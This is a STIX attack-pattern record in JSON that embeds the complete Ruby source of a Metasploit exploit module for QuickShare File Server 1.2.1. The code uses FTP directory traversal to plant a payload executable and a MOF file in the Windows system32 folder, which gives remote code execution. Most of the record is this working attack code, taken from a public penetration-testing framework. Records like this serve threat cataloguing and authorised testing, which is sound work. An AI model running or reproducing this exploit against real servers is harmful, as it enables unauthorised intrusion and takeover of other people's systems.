{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6c28836-4393-4e97-9684-6aa9a9660c9a",
    "created": "2024-08-14T16:50:49.255823Z",
    "modified": "2024-08-14T16:50:49.255827Z",
    "name": "\"QuickShare File Server 1.2.1 Directory Traversal Vulnerability\"",
    "description": " This module exploits a vulnerability found in QuickShare File Server's FTP service.  By supplying \"../\" in the file path, it is possible to trigger a directory traversal flaw, allowing the attacker to read a file outside the virtual directory.  By default, the \"Writable\" option is enabled during account creation, therefore this makes it possible to create a file at an arbitrary location, which leads to remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/quickshare_traversal_write.rb",
            "external_id": "quickshare_traversal_write.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.quicksharehq.com/blog/quickshare-file-server-1-2-2-released.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.digital-echidna.org/2011/02/quickshare-file-share-1-2-1-directory-traversal-vulnerability/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"QuickShare File Server 1.2.1 Directory Traversal Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in QuickShare File Server's FTP\n        service.  By supplying \"../\" in the file path, it is possible to trigger a\n        directory traversal flaw, allowing the attacker to read a file outside the\n        virtual directory.  By default, the \"Writable\" option is enabled during account\n        creation, therefore this makes it possible to create a file at an arbitrary\n        location, which leads to remote code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'modpr0be', #Discovery, PoC\n          'sinn3r'    #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '70776'],\n          ['EDB', '16105'],\n          ['URL', 'http://www.quicksharehq.com/blog/quickshare-file-server-1-2-2-released.html'],\n          ['URL', 'http://www.digital-echidna.org/2011/02/quickshare-file-share-1-2-1-directory-traversal-vulnerability/']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['QuickShare File Server 1.2.1', {}]\n        ],\n      'Stance' => Msf::Exploit::Stance::Aggressive,\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-02-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        # Change the default description so this option makes sense\n        OptPort.new('SRVPORT', [true, 'The local port to listen on for active mode', 8080])\n      ])\n  end\n\n\n  def check\n    connect\n    disconnect\n\n    if banner =~ /quickshare ftpd/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  def on_client_connect(cli)\n    peer = \"#{cli.peerhost}:#{cli.peerport}\"\n\n    case @stage\n    when :exe\n      print_status(\"Sending executable (#{@exe.length.to_s} bytes)\")\n      cli.put(@exe)\n      @stage = :mof\n\n    when :mof\n      print_status(\"Sending MOF (#{@mof.length.to_s} bytes)\")\n      cli.put(@mof)\n    end\n\n    cli.close\n  end\n\n\n  def upload(filename)\n    select(nil, nil, nil, 1)\n\n    peer = \"#{rhost}:#{rport}\"\n    print_status(\"Trying to upload #{::File.basename(filename)}\")\n\n    # We can't use connect_login, because it cannot determine a successful login correctly.\n    # For example: The server actually returns a 503 (Bad Sequence of Commands) when the\n    # user has already authenticated.\n    conn = connect(false, datastore['VERBOSE'])\n\n    res = send_user(datastore['FTPUSER'], conn)\n\n    if res !~ /^(331|2)/\n      fail_with(Failure::BadConfig, \"The server rejected our username: #{res.to_s}\")\n    end\n\n    res = send_pass(datastore['FTPPASS'], conn)\n    if res !~ /^(2|503)/\n      fail_with(Failure::BadConfig, \"The server rejected our password: #{res.to_s}\")\n    end\n\n    # Switch to binary mode\n    print_status(\"Set binary mode\")\n    send_cmd(['TYPE', 'I'], true, conn)\n\n    # Prepare active mode: Get attacker's IP and source port\n    src_ip   = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address(\"50.50.50.50\") : datastore['SRVHOST']\n    src_port = datastore['SRVPORT'].to_i\n\n    # Prepare active mode: Convert the IP and port for active mode\n    src_ip   = src_ip.gsub(/\\./, ',')\n    src_port = \"#{src_port/256},#{src_port.remainder(256)}\"\n\n    # Set to active mode\n    print_status(\"Set active mode \\\"#{src_ip},#{src_port}\\\"\")\n    send_cmd(['PORT', \"#{src_ip},#{src_port}\"], true, conn)\n\n    # Tell the FTP server to download our file\n    send_cmd(['STOR', filename], false, conn)\n\n    disconnect(conn)\n  end\n\n\n  def exploit\n    trigger  = '../../../../../../../../'\n    exe_name = \"#{trigger}WINDOWS/system32/#{rand_text_alpha(rand(10)+5)}.exe\"\n    mof_name = \"#{trigger}WINDOWS/system32/wbem/mof/#{rand_text_alpha(rand(10)+5)}.vbs\"\n    @mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))\n    @exe      = generate_payload_exe\n    @stage = :exe\n\n    begin\n      t = framework.threads.spawn(\"reqs\", false) {\n        begin\n          # Upload our malicious executable\n          u = upload(exe_name)\n\n          # Upload the mof file\n          upload(mof_name) if u\n        rescue ::Exception => e\n          print_error e.message\n          cleanup\n        end\n      }\n      super\n    ensure\n      t.kill\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-02-03",
    "x_mitre_platforms": [
        "win'"
    ]
}